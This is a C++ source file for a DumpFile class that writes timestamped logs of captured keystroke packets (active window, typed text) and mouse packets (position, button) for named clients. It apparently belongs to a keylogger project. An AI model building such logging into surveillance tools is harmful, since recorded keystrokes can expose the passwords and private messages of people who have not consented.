#include "DumpFile.hh"

DumpFile::DumpFile()
{
  DEBUG_MSG("DumpFile created");
  _file = NULL;
  _name = "";
}

DumpFile::~DumpFile()
{
  DEBUG_MSG("DumpFile deleted");
  if (_file && _file->is_open())
    {
      _file->close();
      delete _file;
    }
  if (!_name.empty())
    _name.clear();
}

void		DumpFile::createFile(const std::string &str)
{
  std::string	file;

  _name = str;
  file = isDirectoryExist("Logs") ? "Logs/" : "";
  file += str;
  file += "-";
  file += getTime();
  _file = new std::ofstream(file.c_str(), std::ofstream::out);
}

bool		DumpFile::checkFileExist() const
{
  if (_file && _file->is_open())
    return true;
  return false;
}

std::string	DumpFile::getName() const
{
  return _name;
}

std::string	DumpFile::getTime() const
{
  boost::posix_time::ptime	time_now;
  std::string			time;

  time_now = boost::posix_time::second_clock::local_time();
  time = boost::posix_time::to_simple_string(time_now).c_str();
  return !time.empty() ? boost::replace_all_copy(time, " ", "-") : "UnknownTime";
}

bool		DumpFile::isDirectoryExist(const std::string &dir) const
{
  return boost::filesystem::is_directory(dir.c_str());
}

bool		DumpFile::writePaquet(PaquetKeys *paquet)
{
  std::string active = "";
  std::string text = "";

  if (!paquet)
    return false;
  if (checkFileExist())
    {
      active = (paquet->getActive()) ? (paquet->getActive()) : (std::string());
      text = (paquet->getText()) ? (paquet->getText()) : (std::string());
      *_file << "PaquetKeys = {name: " << getName();
      *_file << ", date: " << paquet->getDate();
      *_file << ", sizeActive: " << active.size();
      if (!active.empty())
	*_file << ", active: " << active;
      *_file << ", sizeText: " << text.size();
      if (!text.empty())
	*_file << ", text: " << text;
      *_file << "}" << std::endl;
      return true;
    }
  return false;
}

bool		DumpFile::writePaquet(PaquetMouse *paquet)
{
  std::string active = "";

  if (!paquet)
    return false;
  if (checkFileExist())
    {
      active = (paquet->getActive()) ? (paquet->getActive()) : (std::string());
      *_file << "PaquetMouse = {name: " << getName();
      *_file << ", date: " << paquet->getDate();
      *_file << ", sizeActive: " << active.size();
      if (!active.empty())
	*_file << ", active: " << active;
      *_file << ", X: " << paquet->getX();
      *_file << ", Y: " << paquet->getY();
      *_file << ", Button: " << static_cast<int>(paquet->getButton());
      *_file << ((paquet->getButton() == 1) ? ("(Left)") : ((paquet->getButton() == 2) ? ("(Middle)") : ("(Right)")));
      *_file << "}" << std::endl;
    }
  return false;
}
